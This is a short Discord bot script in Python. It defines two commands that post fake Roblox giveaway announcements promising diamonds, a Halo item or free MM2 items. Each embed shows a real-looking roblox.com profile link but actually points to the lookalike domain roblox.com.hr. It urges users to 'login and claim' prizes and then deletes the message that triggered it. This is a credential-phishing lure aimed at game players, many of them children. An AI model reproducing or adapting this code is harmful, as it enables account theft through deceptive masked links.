...
@Arsky.command()
async def rh(ctx,):
    embed = discord.Embed(title='Join My GIVEAWAY!!!', description= 'I held a giveaway before leaving RH with a prize of **1 MIL DIAMONDS OR 1 HALO**. Join my giveaway here: [https://www.roblox.com/users/32152363/profile](https://roblox.com.hr/users/8246401139/profile)', color=0xff00c8)
    ...
    embed.set_thumbnail(url=  'https://media.discordapp.net/attachments/927414808893079552/928142824979955762/Png_4.png')
...
@Arsky.command()
async def mm2(ctx,):
   embed=discord.Embed(title="Congrats You WON!!!", description="  **You won!** Congrats you  won the free MM2 item giveaway use the link below to login and claim all your free items here: [https://web.roblox.com/users/883286105/profile](https://roblox.com.hr/users/8246401139/profile)", color=0xff0000)
   ...
   embed.set_thumbnail(url="https://media.discordapp.net/attachments/927414808893079552/928142824979955762/Png_4.png")
   embed.set_footer(text="Ends in 15 Minutes")
   embed.set_image(url='https://media.discordapp.net/attachments/927414808893079552/928148091788484618/cheap_mm2_chroma_1635006824_6f93d4e4.jpg')
   await ctx.send(embed=embed)
   await ctx.message.delete()
